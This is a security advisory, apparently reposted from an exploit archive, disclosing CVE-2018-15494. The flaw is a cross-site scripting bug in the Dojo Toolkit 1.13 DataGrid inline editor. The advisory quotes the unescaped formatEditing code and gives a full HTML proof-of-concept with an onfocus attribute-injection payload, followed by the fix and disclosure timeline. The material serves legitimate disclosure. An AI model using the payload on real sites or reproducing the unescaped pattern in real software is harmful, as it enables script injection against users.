@@ -1,0 +1,146 @@
+id: 30975
+date: 08/28/2018
+title: Dojo Toolkit 1.13 Cross Site Scripting Vulnerability
+author: Moritz Bechler
+cves: CVE-2018-15494
+
+Product: Dojo Toolkit
+Manufacturer: JS Foundation
+Affected Version(s): 1.13
+Tested Version(s): 1.13, 1.10.7
+Vulnerability Type: Cross-Site Scripting (CWE-79)
+Risk Level: Medium
+Solution Status: Fixed
+Manufacturer Notification: 2018-07-02
+Solution Date: 2018-10-13
+Public Disclosure: 2018-10-24
+CVE Reference: CVE-2018-15494
+Author of Advisory: Moritz Bechler, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Dojo Toolkit is a JavaScript framework for building JavaScript based
+applications.
+
+The manufacturer describes the product as follows (see [1]):
+
+"A JavaScript toolkit that saves you time and scales with your
+development process.
+Provides everything you need to build a Web app.
+Language utilities, UI components, and more, all in one place, designed
+to work together perfectly."
+
+Due to improper escaping, applications using Dojo Toolkit may be
+vulnerable to
+cross-site scripting.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The inline editing feature of the dojox.grid.DataGrid component fails to
+properly
+escape the cell value when using it as the input field's value attribute
+while
+editing is activated by clicking.
+
+> formatEditing: function(inDatum, inRowIndex){
+>     this.needFormatNode(inDatum, inRowIndex);
+>     return '<input class="dojoxGridInput" type="text" value="' +
+inDatum + '">';
+> },
+
+
+That allows additional element attributes to be introduced, including an
+"onfocus"
+handler that will immediately get executed when editing mode is activated.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof-of-Concept (PoC):
+
+
+Demo website with Dojo's dojox.grid.DataGrid component:
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<style type="text/css">
+    @import
+"https://ajax.googleapis.com/ajax/libs/dojo/1.13.0/dojox/grid/resources/Grid.css";
+    html, body {
+        width: 100%; height: 100%;
+    }
+</style>
+</head>
+<body>
+<script type="text/javascript"
+src="https://ajax.googleapis.com/ajax/libs/dojo/1.13.0/dojo/dojo.js"></script>
+<script type="text/javascript">
+    dojo.require("dojox.grid.DataGrid");
+    dojo.require("dojo.data.ItemFileWriteStore");
+
+    dojo.addOnLoad(function(){
+      var g = new dojox.grid.DataGrid({
+          store: new dojo.data.ItemFileWriteStore({
+            data: {"items" : [ {"foo" : 'bar" onfocus="alert(1)"'} ] }
+          }),
+          structure: [
+            { field: 'foo', width : '100%', editable: true }
+          ]
+      });
+      dojo.byId("container").appendChild(g.domNode);
+      g.startup();
+    });
+</script>
+<div id="container" style="width: 100%; height: 100%;"></div>
+</body>
+</html>
+
+When clicking the table row to start editing, the cell value is inserted
+into a
+text input's value attribute without proper escaping, resulting in
+markup like
+
+<input class="dojoxGridInput" value="bar" onfocus="alert(1)" "=""
+type="text">
+
+which introduces JavaScript code in the "onfocus" handler that gets
+immediately
+executed.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Update to version 1.14 of Dojo Toolkit.
+
+More Information:
+
+Vendor announcement: https://dojotoolkit.org/blog/dojo-1-14-released
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2018-06-04: Vulnerability discovered
+2018-07-02: Vulnerability reported to manufacturer
+2018-10-13: Patch released by manufacturer
+2018-10-24: Public disclosure of vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product website for Dojo Toolkit
+    https://dojotoolkit.org/
+[2] SySS Security Advisory SYSS-2018-010
+   
+https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-010.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+
+#  0day.today [2023-03-27]  #
